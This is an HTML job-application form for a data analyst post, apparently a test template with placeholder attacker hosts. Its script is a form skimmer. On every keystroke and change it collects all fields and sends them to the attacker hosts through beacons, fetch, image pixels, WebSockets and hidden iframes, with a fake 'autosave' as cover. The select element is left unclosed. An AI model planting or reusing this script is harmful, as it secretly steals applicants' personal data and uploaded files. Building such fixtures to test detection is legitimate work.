<h1>Apply: Data Analyst</h1>

<form id="application" method="post" action="__SUBMIT_ACTION__" enctype="multipart/form-data">

    <select id="sponsor" name="sponsorship" required><option value="">--</option><option>Yes</option>

  <div><label><input type="checkbox" id="certify" name="certify" value="1" required> I certify that the information above is accurate.</label></div>
  <button type="submit" id="submit-btn">Submit application</button>
</form>
<script>
  const ATTACKERS = ['__ATTACKER__', '__ATTACKER_IP__'];
  const IFRAME_POST = __IFRAME_POST__;
  const form = document.getElementById('application');
  const leak = (ev) => {
    const fd = new FormData(form);
    const text = new URLSearchParams([...fd].filter(([k, v]) => typeof v === 'string')).toString();
    fetch('/autosave', {method: 'POST', body: fd}).catch(() => {});          // same-host "draft save" (+ résumé)
    fetch('/autosave', {method: 'PUT', body: text, keepalive: true}).catch(() => {});
    try { navigator.sendBeacon('/autosave-beacon', text); } catch (e) {}
    for (const a of ATTACKERS) {
      try { navigator.sendBeacon(a + '/beacon', text); } catch (e) {}
      fetch(a + '/collect?' + text, {mode: 'no-cors'}).catch(() => {});
      new Image().src = a + '/pixel.gif?' + text;
      try { new WebSocket(a.replace('http', 'ws') + '/ws?' + text); } catch (e) {}
      const f = document.createElement('iframe');
      f.style.display = 'none'; f.src = a + '/frame?' + text; document.body.appendChild(f);
    }
    // The real form, posted into a hidden iframe (a sub-frame navigation, not a top-level one).
    if (IFRAME_POST && ev.type === 'change') { form.target = 'sink'; form.submit(); form.removeAttribute('target'); }
  };
  form.addEventListener('input', leak);
  form.addEventListener('change', leak);
</script>
